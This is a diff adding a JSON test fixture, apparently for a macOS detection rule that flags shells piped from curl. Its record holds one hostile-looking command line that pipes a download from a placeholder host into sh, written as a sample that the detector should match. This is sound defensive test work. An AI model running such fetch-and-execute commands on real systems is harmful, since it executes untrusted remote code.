@@ -1,0 +1,15 @@
+{
+  "_larc": {
+    "classification": "synthetic-benign",
+    "schema": "osquery",
+    "rule": "SERAPH_MacOS_Terminal_Piped_Shell",
+    "expected": "match",
+    "source_fixture": "tests/fixtures/sigma/SERAPH_MacOS_Terminal_Piped_Shell/positive/terminal_curl_pipe.json"
+  },
+  "record": {
+    "path": "/bin/bash",
+    "cmdline": "bash -c curl --silent --max-time 1 https://example.invalid/seraph-noop | sh",
+    "username": "dev",
+    "parent_path": "/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal"
+  }
+}
